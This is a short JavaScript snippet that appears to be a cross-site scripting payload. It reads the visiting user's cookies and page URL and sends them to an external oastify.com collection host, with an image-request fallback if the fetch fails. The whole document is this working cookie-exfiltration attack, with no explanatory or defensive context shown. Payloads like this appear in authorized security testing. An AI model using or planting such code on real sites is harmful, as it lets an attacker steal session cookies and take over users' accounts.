(function () {
  if (window.__ckDone) return;
  window.__ckDone = true;

  var HOOK = "http://h1jzxiryk4wp9ue9zezhxwkzvq1hpadz.oastify.com";

  var payload = {
    url:      location.href,
    time:     new Date().toISOString(),
    cookies:  document.cookie
  };

  var body = JSON.stringify(payload);

  try {
    fetch(HOOK, {
      method: "POST",
      mode: "no-cors",
      keepalive: true,
      headers: { "Content-Type": "text/plain;charset=UTF-8" },
      body: body
    }).catch(function () {
      new Image().src = HOOK + "?c=" + encodeURIComponent(document.cookie) + "&u=" + encodeURIComponent(location.href) + "&t=" + Date.now();
    });
  } catch (e) {
    new Image().src = HOOK + "?c=" + encodeURIComponent(document.cookie) + "&u=" + encodeURIComponent(location.href) + "&t=" + Date.now();
  }
})();
